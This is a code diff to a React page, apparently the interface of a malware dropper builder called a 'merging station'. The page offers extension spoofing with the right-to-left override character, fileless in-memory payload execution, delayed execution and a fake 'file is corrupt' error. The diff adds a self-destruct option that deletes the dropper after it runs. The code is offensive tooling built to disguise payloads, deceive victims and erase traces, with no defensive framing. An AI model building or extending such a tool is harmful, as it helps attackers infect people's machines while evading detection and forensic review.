@@ -35,6 +35,7 @@ const formSchema = z.object({
   fileless: z.boolean().default(true),
   showFakeError: z.boolean().default(false),
   fakeErrorMessage: z.string().optional(),
+  selfDestruct: z.boolean().default(false),
 });
 
 const outputFormats = {
@@ -69,6 +70,7 @@ export default function MergingStationPage() {
       fileless: true,
       showFakeError: false,
       fakeErrorMessage: 'The file is corrupt and cannot be opened.',
+      selfDestruct: false,
     },
   });
 
@@ -138,6 +140,7 @@ export default function MergingStationPage() {
             executionDelay: values.executionDelay,
             fileless: values.fileless,
             fakeErrorMessage: values.showFakeError ? values.fakeErrorMessage : undefined,
+            selfDestruct: values.selfDestruct,
         });
         
         if (!response.success || !response.scriptContent) {
@@ -150,6 +153,7 @@ export default function MergingStationPage() {
         if (values.fileless) log(`Fileless execution enabled.`);
         if (values.executionDelay) log(`Execution delayed by ${values.executionDelay} seconds.`);
         if (values.showFakeError) log(`Fake error message enabled.`);
+        if (values.selfDestruct) log(`Self-destruct enabled.`);
 
         const finalName = values.extensionSpoofing
             ? applyExtensionSpoofing(values.outputName)
@@ -240,6 +244,7 @@ export default function MergingStationPage() {
                    <FormField control={form.control} name="extensionSpoofing" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Extension Spoofing</FormLabel><FormDescription>Use RLO character to mask the true extension.</FormDescription></div></FormItem> )}/>
                    <FormField control={form.control} name="fileless" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Fileless Execution</FormLabel><FormDescription>Run payload in memory instead of writing to disk.</FormDescription></div></FormItem> )}/>
                    <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} /></FormControl></FormItem> )}/>
+                   <FormField control={form.control} name="selfDestruct" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Self-Destruct after Execution</FormLabel><FormDescription>Remove the dropper script after it runs.</FormDescription></div></FormItem> )}/>
                      <FormField control={form.control} name="showFakeError" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Display Fake Error Message</FormLabel></div></FormItem> )}/>
                      {watchShowFakeError && (
                         <FormField control={form.control} name="fakeErrorMessage" render={({ field }) => ( <FormItem><FormLabel>Error Message</FormLabel><FormControl><Textarea placeholder="The file is corrupt..." {...field} /></FormControl><FormMessage /></FormItem> )}/>
